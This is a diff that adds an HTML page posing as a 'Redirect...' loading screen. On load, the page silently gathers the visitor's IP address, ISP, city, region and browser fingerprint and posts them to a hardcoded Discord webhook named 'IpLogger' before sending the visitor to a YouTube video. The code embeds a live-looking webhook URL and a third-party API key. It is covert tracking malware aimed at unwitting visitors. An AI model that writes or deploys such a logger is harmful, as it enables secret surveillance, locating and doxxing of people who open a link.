@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect...</title>
+</head>
+<body>
+    <style>
+      *{
+        margin: 0;
+        padding: 0;
+      }
+      body{
+        background: rgb(20,20,20);
+      }
+      .wrapper{
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 25vw;
+        height: 25vw;
+        border-top: 4px solid white;
+        border-left: 4px solid white;
+        border-bottom:4px solid white ;
+        border-right: none;
+        border-radius: 50%;
+        transform: translate(-50%,-50%);
+        animation: rotate 2s ease-in-out infinite;
+      }
+      p{
+        color: rgb(20,20,20);
+        opacity: 0;
+      }
+      @keyframes rotate {
+        0%{
+          transform:translate(-50%,-50%) rotate(0deg);
+        }
+        100%{
+          transform:translate(-50%,-50%) rotate(360deg);
+        }
+      }
+    </style>
+    <div class="wrapper">
+      <p>Loading...</p>
+    </div>
+    <script>
+        function sendMessage(message) {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1070475930444767324/v7VHsWTNMAVLt0FhCyRy3p7RZHvT197cVR-tWnksoucCg5aglcDxoV2WJx1q-i9-vKeA",false);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "IpLogger",
+        avatar_url: "",
+        content: message
+      }
+      request.send(JSON.stringify(params))
+      window.location.assign("https://www.youtube.com/watch?v=3BFTio5296w");
+    }
+    </script>
+    <script>
+        var timeOpened = new Date();
+  var timezone= (new Date()).getTimezoneOffset()/60;
+
+  function pageon(){try{return window.location.pathname}catch{return undefined;}}
+  function referrer(){try{return document.referrer}catch{return undefined}}
+  function previousSites(){try{return history.length}catch{return undefined}}
+ 
+  function browserName(){try{return navigator.appName}catch{return undefined}}
+  function browserEngine(){try{return navigator.product}catch{return undefined}}
+  function browserVersion1a(){try{return navigator.appVersion}catch{return undefined}}
+  function browserVersion1b(){try{return navigator.userAgent}catch{return undefined}}
+  function browserLanguage(){try{return navigator.language}catch{return undefined}}
+  function browserOnline(){try{return navigator.onLine}catch{return undefined}}
+  function browserPlatform(){try{return navigator.platform}catch{return undefined}}
+  function javaEnabled(){try{return navigator.javaEnabled()}catch{return undefined}}
+  function dataCookiesEnabled(){try{return navigator.cookieEnabled}catch{return undefined}}
+  function dataCookies1(){try{return document.cookie}catch{return undefined}}
+  function dataCookies2(){try{return decodeURIComponent(document.cookie.split(";"))}catch{return undefined}}
+  function dataStorage(){try{return localStorage}catch{return undefined}}
+
+  function sizeScreenW(){try{return screen.width}catch{return undefined}}
+  function sizeScreenH(){try{return screen.height}catch{return undefined}}
+  function sizeDocW(){try{return document.width}catch{return undefined}}
+  function sizeDocH(){try{return document.height}catch{return undefined}}
+  function sizeInW(){try{return innerWidth}catch{return undefined}}
+  function sizeInH(){try{return innerHeight}catch{return undefined}}
+  function sizeAvailW(){return screen.availWidth}
+  function sizeAvailH(){return screen.availHeight}
+  function scrColorDepth(){return screen.colorDepth}
+  function scrPixelDepth(){return screen.pixelDepth}
+
+  function latitude(){return position.coords.latitude}
+  function longitude(){return position.coords.longitude}
+  function accuracy(){return position.coords.accuracy}
+  function altitude(){return position.coords.altitude}
+  function altitudeAccuracy(){return position.coords.altitudeAccuracy}
+  function heading(){return position.coords.heading}
+  function speed(){return position.coords.speed}
+  function timestamp(){return position.timestamp}
+
+    </script>
+    <script>
+        const getMessage = (ip,params)=>{
+          console.log(typeof params,params);
+          const in_par = JSON.parse(params);
+          try{
+            return `Hop un nouveau visiteur à tracer: \nip: ${ip}\nFAI:${in_par.isp}\nPays:${in_par.country}\nregion:${in_par.region}\nVille à laquelle l'ip est enregistrée:${in_par.city}\nBrowserName: ${browserName()}\nBrowserEngine ${browserEngine()}\nBrowserlanguage: ${browserLanguage()}\nAppVersion: ${browserVersion1a()}\nUserAgent: ${browserVersion1b()}\nLangue du navigateur : ${browserLanguage()}\nBrowserplatform: ${browserPlatform()}\nJavascript activé: ${javaEnabled()}\nCookies activés: ${dataCookiesEnabled()}\nScreenWidth: ${sizeScreenW()}\nScreenHeight${sizeScreenH()}`
+          }catch{
+            return `Hop un nouveau visiteur à tracer: \nip: ${ip}\nBrowserName: ${browserName()}\nBrowserEngine ${browserEngine()}\nBrowserlanguage: ${browserLanguage()}\nAppVersion: ${browserVersion1a()}\nUserAgent: ${browserVersion1b()}\nLangue du navigateur : ${browserLanguage()}\nBrowserplatform: ${browserPlatform()}\nJavascript activé: ${javaEnabled()}\nCookies activés: ${dataCookiesEnabled()}\nScreenWidth: ${sizeScreenW()}\nScreenHeight${sizeScreenH()}`
+          }
+        }
+    </script>
+    <script>
+         function getIp(){
+            fetch("https://api.ipify.org/?format=json")
+  .then(response => {
+    // indicates whether the response is successful (status code 200-299) or not
+    if (!response.ok) {
+      throw new Error(`Request failed with status ${reponse.status}`)
+    }
+    return response.json()
+  })
+  .then(data => {
+    var ip = data.ip;
+    try{
+      var ip_info = new XMLHttpRequest();
+      ip_info.open("GET",`https://api.api-ninjas.com/v1/iplookup?address=${ip}`,false);
+      ip_info.setRequestHeader("X-Api-Key","oa1gfML8j88c7MaBi8yCrQ==nXBxkW1cHwuJDF53");
+      ip_info.send('');
+    }catch{
+      var ip_info = {"response":'{"none":"none"}'};
+    }
+    sendMessage(getMessage(ip,ip_info.response));
+  })
+  .catch(error => console.log(error))
+        }
+    getIp();
+    </script>
+</body>
+</html>
